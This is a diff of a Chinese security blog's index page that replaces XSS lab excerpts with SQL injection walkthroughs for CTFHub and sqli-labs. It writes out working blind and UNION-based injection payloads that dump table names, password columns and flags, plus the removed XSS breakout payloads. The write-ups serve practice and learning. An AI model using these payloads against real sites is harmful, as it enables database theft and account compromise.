@@ -152,34 +152,38 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-PHP_pwethebox-php是直接最好的语言" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-ctfhub 盲注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/28/PHP_pwethebox-php%E6%98%AF%E7%9B%B4%E6%8E%A5%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80/">php</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/28/PHP_pwethebox-php%E6%98%AF%E7%9B%B4%E6%8E%A5%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80/" class="archive-article-date">
-  	<time datetime="2022-04-28T06:45:54.019Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-28</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h3 id="pwnthebox-php是最好的语言"><a href="#pwnthebox-php是最好的语言" class="headerlink" title="pwnthebox-php是最好的语言"></a>pwnthebox-php是最好的语言</h3><p>审计代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="comment">//前端攻城狮跑路了，不过PHP是最好的语言</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$good</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="variable">$good</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;bypass&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$good</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key==<span class="variable">$key</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;还差一点就拿到flag了&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="ctfhub-盲注"><a href="#ctfhub-盲注" class="headerlink" title="ctfhub 盲注"></a>ctfhub 盲注</h1><p>盲注问题，先判断数据库 长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (length(database())=1)--+</span><br></pre></td></tr></table></figure>
 
-<p>这里有三个参数，其中a的值要和b的值相等，k的值经过了json_decode加密，我们让key&#x3D;{“key”;0},构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxxxxxxx/?a=1&amp;b=1&amp;key=&#123;&quot;key&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+<p>等于4时判断成功</p>
+<p>判断数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (left(database(),4)=&#x27;sqli&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p>得到flag。</p>
+<p>最后判断数据库名为sqli</p>
+<p>其数据库的表名数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(table_name) from information_schema.`TABLES` where table_schema = database())=2</span><br></pre></td></tr></table></figure>
 
+<p>得到表名数量为2</p>
+<p>求表名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and length((select table_name from information_schema.`TABLES` where table_schema = database() limit 0,1))=4</span><br></pre></td></tr></table></figure>
+
+<p>长度为4</p>
+<p>判断表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  AND ASCII(SUBSTR( (select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1), 1,1)) = 102</span><br></pre></td></tr></table></figure>
+
+<p>判断第一个表名为flag，那么flag大概率在该表下，判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns</span><br><span class="line"> where table_name=&#x27;flag&#x27;)=1</span><br></pre></td></tr></table></figure>
+
+<p>判断为1，继续判断字段名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and ASCII(SUBSTR((select column_name from information_schema.columns</span><br><span class="line"> where table_name=&#x27;flag&#x27;),1,1))=102</span><br></pre></td></tr></table></figure>
+
+<p>判断仍为flag，接下来就猜flag就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and ASCII(SUBSTR((select * from sqli.flag where id=1),1,1))&gt;110</span><br><span class="line"></span><br></pre></td></tr></table></figure>
       
 
       
@@ -191,7 +195,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/28/PHP_pwethebox-php%E6%98%AF%E7%9B%B4%E6%8E%A5%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/06/07/ctfhub%20%E7%9B%B2%E6%B3%A8/">展开全文 >></a>
         </p>
       
 
@@ -221,67 +225,68 @@
 
 
   
-    <article id="post-CTFHub_N1Book-XSS闯关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-sqli_lab" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/27/CTFHub_N1Book-XSS%E9%97%AF%E5%85%B3/">XSS</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/27/CTFHub_N1Book-XSS%E9%97%AF%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2022-04-27T02:57:08.578Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="CTFHub-N1Book-XSS闯关"><a href="#CTFHub-N1Book-XSS闯关" class="headerlink" title="CTFHub_N1Book-XSS闯关"></a>CTFHub_N1Book-XSS闯关</h1><h5 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h5><p>查看前端源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;a-TplField&quot;</span>&gt;</span>welcome xss<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli_lab"></a>sqli_lab</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>先构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1</span><br></pre></td></tr></table></figure>
 
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1?username=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>页面正常，继续构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>页面错误，初步判断为字符型注入，继续构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>页面正常，判定为字符型注入，判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1&#x27; order by 1--+</span><br></pre></td></tr></table></figure>
+
+<p>最后测出字段数为3，查数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<p>库名security，继续查询表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1 &#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+
+<p>然后我们查询users表下的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%22users%22--+</span><br></pre></td></tr></table></figure>
+
+<p>查询password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,2,password%20from%20users--+</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h5 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h5><p>查看源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">    	&#125;</span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1</span><br></pre></td></tr></table></figure>
 
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level2?username=alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>不行，查看源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;alert(1)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>显示错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1’--+</span><br></pre></td></tr></table></figure>
 
-<p>闭合绕过一下，构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level2?username=&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
+<p>同显示错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1 and 1=1</span><br></pre></td></tr></table></figure>
 
+<p>显示正确，判断为数字型注入，基本与less_1一致</p>
 <hr>
-<h5 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h5><p>查看源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/?id=1</span><br></pre></td></tr></table></figure>
 
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level3?username=alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1’</span><br></pre></td></tr></table></figure>
 
-<p>不行，上源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;alert(1)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>显示错误，发现有括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p>闭合一下试一试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level3?username=&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
-
-<p>不行，继续看源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;\&#x27;;alert(1);//&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现单引号被转义，构造payload</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level3?username=&#x27;&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
-
-<p>成功进入下一关</p>
+<p>显示正常，接下来与第一关基本一致</p>
 <hr>
-<h5 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h5>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>正常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>报错，且显示括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1&quot;)--+</span><br></pre></td></tr></table></figure>
+
+<p>正常，后面参考less_3</p>
+<hr>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2>
       
 
       
@@ -293,7 +298,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/27/CTFHub_N1Book-XSS%E9%97%AF%E5%85%B3/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/06/06/sqli_lab/">展开全文 >></a>
         </p>
       
 
@@ -323,75 +328,18 @@
 
 
   
-    <article id="post-XSS漏洞入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-ctfhub vim" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/26/XSS%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">XSS</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/26/XSS%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/" class="archive-article-date">
-  	<time datetime="2022-04-26T08:34:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-26</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="XSS漏洞入门"><a href="#XSS漏洞入门" class="headerlink" title="XSS漏洞入门"></a>XSS漏洞入门</h1><p><strong>XSS</strong>又叫CSS(Cross Site Script)跨站脚本攻击。</p>
-<h2 id="什么是跨站脚本攻击呢？"><a href="#什么是跨站脚本攻击呢？" class="headerlink" title="什么是跨站脚本攻击呢？"></a>什么是跨站脚本攻击呢？</h2><p>  它指的是攻击者在web页面中插入恶意的js代码，当用户浏览该页面时嵌入其web页面的恶意js代码将会被执行，从而达到攻击者的一些恶意目的(可以通过xss和csrf结合起来达到getshell的效果)。<br>利用我们已知的一些方法向web页面插入js代码，使插入的js代码被浏览器执行，访问该页面的用户就会遭到攻击。</p>
-<p><img src="/../images/1.png"></p>
-<p>xss的危害：</p>
-<p>1、网络钓鱼，包括盗取各类用户账号；</p>
-<p>2、窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</p>
-<p>3、劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等；</p>
-<p>4、强制弹出广告页面、刷流量等；</p>
-<p>5、网页挂马，进行恶意操作，例如任意篡改页面信息、删除文章等；</p>
-<p>6、进行大量的客户端攻击，如DDoS攻击；</p>
-<p>7、获取客户端信息，例如用户的浏览历史、真实IP、开放端口等；</p>
-<p>8、控制受害者机器向其他网站发起攻击；</p>
-<p>9、结合其他漏洞，如CSRF漏洞，进一步入侵和破坏系统；</p>
-<p>10、提升用户权限，包括进一步渗透网站；</p>
-<p>11、传播跨站脚本蠕虫等；</p>
-<p>主要的受害对象是：使用含有xss漏洞网页的用户。</p>
-<hr>
-<h2 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h2><h4 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1.反射型"></a>1.反射型</h4><p>通过get请求发送到后端，后端直接打印给前端页面上这一过程就称之为反射型xss。</p>
-<p>我们以DVWA靶场为例</p>
-<p><img src="/../images/2.png"></p>
-<p>我们输入一段弹窗脚本，点击提交，结果如下</p>
-<p><img src="/../images/3.png"></p>
-<p>弹窗脚本成功执行，我们右键查看源代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line">2		<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">3			<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">4				What&#x27;s your name?</span><br><span class="line">5				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">6				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">7			<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">8</span><br><span class="line">9		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">10		<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(666)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">11	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="ctfhub-vim"><a href="#ctfhub-vim" class="headerlink" title="ctfhub vim"></a>ctfhub vim</h1><p>dirsearch扫一下</p>
+<p>index.php.swp</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxxx/.index.php.swp</span><br></pre></td></tr></table></figure>
 
-<p>从源码可知我们提交的脚本内容被成功识别并执行。这个弹窗并没有什么实际的意义，但通过它我们知道输入javascript代码是可以被执行的，当我们输入一些其他函数，比如<code>document.cookie</code>就可以成功盗取用户的cookie信息，或者读取用户浏览器信息等，为我们进一步深入攻击做铺垫。</p>
-<hr>
-<h4 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h4><p>  通过get或者post方式提交请求到后端，后端会将请求数据保存并一直打印到web页面。</p>
-<p>  同样以DVWA靶场为例</p>
-<p><img src="/../images/4.png"></p>
-<p>  此窗口模拟了评论功能，我们输入js弹窗脚本，发表</p>
-<p><img src="/../images/5.png"></p>
-<p>成功弹窗</p>
-<p><img src="/../images/6.png"></p>
-<p>右键查看源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;guestbook_comments&quot;</span>&gt;</span>Name: test<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Message: This is a test comment.<span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;guestbook_comments&quot;</span>&gt;</span>Name: 123<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Message: 666<span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;guestbook_comments&quot;</span>&gt;</span>Name: 123<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Message: 123123<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(666)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们可以看出脚本被打印到web界面，这表示以后每当用户打开这个界面就会执行一次弹窗。</p>
-<h4 id="3-Dom型"><a href="#3-Dom型" class="headerlink" title="3.Dom型"></a>3.Dom型</h4><p>  通过该请求提交到前端的js代码中进行处理，前端的js会将其直接打印到web页面中和反射型xss的区别在于dom不需要将数据提交到后端而是在前端直接进行处理直接用document.write 等函数将数据输出到web页面上。</p>
-<p><img src="/../images/7.png"></p>
